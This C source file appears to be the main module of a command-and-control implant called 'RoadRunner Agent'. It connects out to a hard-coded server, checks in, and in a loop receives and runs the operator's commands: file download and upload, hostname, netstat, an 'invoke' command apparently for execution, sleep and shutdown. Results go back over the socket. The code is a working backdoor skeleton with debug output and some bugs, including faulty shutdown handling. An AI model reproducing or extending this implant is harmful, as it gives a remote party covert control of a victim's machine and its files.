/**
 * roadrunner.c contains the main function of the program.
 * @file roadrunner.c
 */
// include what we need for the functionality
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
// include our own libraries here
#include <roadrunner.h>
#include <core.h>
#include <helloworld.h>
#include <utils.h>
#include <files.h>
#include <sys.h>
#include <proxy.h>

// declare our functions, these are static so they are not exported
static bool send_response(int sock_fd, Response *rsp);
static int connect_to_server();
static bool perform_command(Command *cmd, Response **rsp);
static Command *receive_command(int sock_fd);
void *get_in_addr(struct sockaddr *sa);
/**
 * The main function for the RoadRunner Agent.
 * @return an integer return code (0 = good, 1 = bad)
 */
int main() 
{
    int sock_fd = 0;
    Command *cmd = NULL;
    bool is_running = true;
    // char *response = NULL;
    while(true)
    {   
        // connect and checkin
        if(sock_fd == 0)
        {
            sock_fd = connect_to_server();
        }
        Response *rsp = checkin_command();
        send_response(sock_fd, rsp);
        // Recieve
        while(is_running)
        {
            cmd = receive_command(sock_fd);
            // perform command
            if(NULL == cmd || cmd->cmd == NULL || cmd->args == NULL || cmd->args_len == NULL || cmd->cmd_len == NULL)
            {
                rsp = alloc_response(0, "Failed to perform command", 26);
            }
            else
            {
                is_running = perform_command(cmd, &rsp);   
            }
            sleep(3);
            // send response
            send_response(sock_fd, rsp);
            if(false == is_running)
            {
                printf("shutting down\n");
                close(sock_fd);
                free_response(rsp);
                free_command(cmd);
            }
        }
    }
    return 0;
}

/******************************* AGENT CODE ***********************************/

/**
 * Perform a command sent by the server and send back a response.
 * @param cmd (in) a pointer to the command structure
 * @param rsp_out (out) a Response pointer that returns the command response
 * @return a bool indicating if the agent needs to shutdown (true = continue, false = shutdown)
 */
static bool perform_command(Command *cmd, Response **rsp_out)
{
    
    // perform an "if else" tree checking the command against all known command strings

    // need to know if we need to continue running after executing the command
    // shutdown command is the only one to actually stop the agent
    printf("\n-------------------------Command Requested---------------------------\n");
    printf("cmd->cmd: %s\n", cmd->cmd);
    printf("cmd->args: %s\n", cmd->args);
    if (strcmp(cmd->cmd, "shutdown") == 0)
    {
        RR_DEBUG_PRINT("received: shutdown command\n")
        *rsp_out = alloc_response(0, "shutting down", 14);
        return false;
    }
    else if (strcmp(cmd->cmd, "download") == 0)
    {
        RR_DEBUG_PRINT("received: download command\n")
        *rsp_out = download_file_command(cmd);
    }
    else if (strcmp(cmd->cmd, "sleep") == 0)
    {
        RR_DEBUG_PRINT("received: sleep command\n")
        *rsp_out = sleep_command(cmd);
    }
    else if (strcmp(cmd->cmd, "upload") == 0)
    {
         RR_DEBUG_PRINT("received: upload command\n")
        *rsp_out = upload_file_command(cmd);
    }
    else if (strcmp(cmd->cmd, "hostname") == 0)
    {
        RR_DEBUG_PRINT("received: hostname command\n")
        // TODO: Need to fix output, too many bytes
        *rsp_out = hostname_command(cmd);
    }
    else if (strcmp(cmd->cmd, "proclist") == 0)
    {
        // TODO: not needed yet
        RR_DEBUG_PRINT("received: process list command\n")
    }
    else if (strcmp(cmd->cmd, "netstat") == 0)
    {
        RR_DEBUG_PRINT("received: netstat command\n")
        *rsp_out = get_netstat_command(cmd);
    }
    else if (strcmp(cmd->cmd, "invoke") == 0)
    {
        RR_DEBUG_PRINT("received invoke command\n")
        *rsp_out = invoke_command(cmd);
    }
    else if (strcmp(cmd->cmd, "proxy") == 0)
    {
        // TODO: not needed yet
        RR_DEBUG_PRINT("received: proxy command\n")
    }
    else
    {
        *rsp_out = alloc_response(0, HOSTNAME_ERROR_MSG, sizeof(HOSTNAME_ERROR_MSG));
    }

    return true;
}


/****************************** NETWORK CODE **********************************/

/**
 * Send the response to the server.
 * @param sock_fd (in) a valid socket file descriptor
 * @param rsp (in) the response to be sent
 * @return a bool representing if the transmission had an error
 */
static bool send_response(int sock_fd, Response *rsp)
{
    // Serialize response
    char *response_out = NULL;
    uint32_t msg_size = 0;
    printf("rsp->msg: %s\n", rsp->msg);
    msg_size = serialize_response(rsp, &response_out);
    // Send Response
    int totalTransmitted = 0;
    int bytesTransmitted = 0;
    printf("msg_size: %d\n", msg_size);
    
    while(totalTransmitted < msg_size)
    {
        printf("bytesTransmitted: %d\n", bytesTransmitted);
        bytesTransmitted = write(sock_fd,
                                response_out+totalTransmitted,
                                msg_size-totalTransmitted);
        printf("bytesTransmitted after: %d\n", bytesTransmitted);
        if(bytesTransmitted == -1){
            fprintf(stderr,
                    "Error: Write() -> %d\n",
                    bytesTransmitted);
            return -3;
        }
        totalTransmitted += bytesTransmitted;
    }
    free_response(rsp);

    return false;
}

/**
 * Receive a command from the C2 server.
 * @param sock_fd a valid socket file descriptor
 * @return a pointer to a Command structure
 */
static Command *receive_command(int sock_fd)
{
    Command *cmd = NULL;
    uint32_t bytesTransmitted = 0;
    char *data_buffer;
    int32_t total_size = 0;
    data_buffer = calloc(1, sizeof(uint32_t));
    bytesTransmitted = recv(sock_fd, data_buffer, sizeof(int32_t), 0);
    if(bytesTransmitted == -1){
        fprintf(stderr,
                "Error: Recv() -> %d.\n", 
                bytesTransmitted);
        return NULL;
    }
    memcpy(&total_size, data_buffer, sizeof(uint32_t));
    total_size = ntohl(total_size);
    if(0 >= total_size)
    {
        printf("Message size is too small\n");
        return NULL;
    }
    printf("total_size %d\n", total_size);
    printf("reallocation data_buffer\n");
    data_buffer = realloc(data_buffer, total_size);
    uint32_t mem_offset = sizeof(uint32_t);
    memset(data_buffer + mem_offset, 0, total_size - mem_offset);
    int32_t bytesRecieved = 0;
    bytesTransmitted = 0;
    bytesRecieved = recv(sock_fd,
                            data_buffer + mem_offset,
                            total_size - mem_offset,
                            0);
    // Check bad read
    if(bytesRecieved == -1){
        fprintf(stderr,
                "Error: Recv() -> %d.\n", 
                bytesRecieved);
        return NULL;
    }
    printf("bytesReceived: %d\n", bytesRecieved);
    cmd = deserialize_command(total_size, data_buffer);
    printf("command: %s args: %s\n", cmd->cmd, cmd->args);
    checkfree(data_buffer);
    return cmd;
}


/**
 * Connect to a C2 server.
 * @return a socket file descriptor
 */
static int connect_to_server()
{
    struct addrinfo *servInfo;
    struct addrinfo hints;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    int errCode = getaddrinfo(HOST, PORT, &hints, &servInfo);
    if(errCode != 0){
        fprintf(stderr,
                "Error: GetAddrinfo -> %s\n",
                gai_strerror(errCode));
        return -1;
    }
    struct addrinfo* pIter;
    int socketFileDescriptor;
    for(pIter = servInfo; pIter != NULL; pIter = pIter->ai_next){
        socketFileDescriptor = socket(	pIter->ai_family,
                                        pIter->ai_socktype,
                                        pIter->ai_protocol);
        if(socketFileDescriptor == -1){
            fprintf(stderr,
                    "Error: Socket() -> %d\n",
                    socketFileDescriptor);
            continue;
        }
        errCode = connect(	socketFileDescriptor,
                            pIter->ai_addr,
                            pIter->ai_addrlen);
        if(errCode == -1){
            fprintf(stderr, "Error: Connect() -> %d\n", errCode);
            close(socketFileDescriptor);
            continue;
        }
        break;
    }
    char hostString[INET6_ADDRSTRLEN] = {'\0'};
    inet_ntop(	pIter->ai_family,
                pIter->ai_addr->sa_data,
                hostString,
                sizeof(hostString));
    printf("Connecting to %s\n", hostString);
    freeaddrinfo(servInfo);
    return socketFileDescriptor;
}
void *get_in_addr(struct sockaddr *sa)
{
   if (sa->sa_family == AF_INET) {
       return &(((struct sockaddr_in*)sa)->sin_addr);
   }
   return &(((struct sockaddr_in6*)sa)->sin6_addr);
}